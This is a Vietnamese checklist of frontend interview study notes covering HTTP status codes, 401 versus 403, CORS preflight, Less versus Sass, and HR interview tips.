- [ ] **Status codes key**: 200 OK, 201 Created, 204 No Content, 301 Permanent, 302 Temporary, 304 Not Modified, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Rate Limit, 500 Internal, 502 Bad Gateway, 503 Unavailable!
- [ ] **401 vs 403**: 401 = CHƯA xác thực (cần login!); 403 = ĐÃ xác thực nhưng KHÔNG có quyền!
- [ ] **OPTIONS**: CORS preflight; browser tự gửi cho non-simple requests; server trả Allow-Origin/Methods/Headers; Max-Age cache!
- [ ] **Simple request**: GET/HEAD/POST + standard headers + standard Content-Types → KHÔNG cần preflight!
- [ ] **Less vs Sass**: Less dùng @var, Sass dùng $var; Sass có @if/@for/@each/@function mạnh hơn; cả 2 có nesting/mixins/extend!
- [ ] **HR**: STAR method; nói cụ thể + có số; research công ty; thể hiện đam mê + cam kết + tự học!

---

_Nguồn: ByteDance Frontend Interview — Three Side + HR · LeetCode 21_
_Cập nhật lần cuối: Tháng 2, 2026_
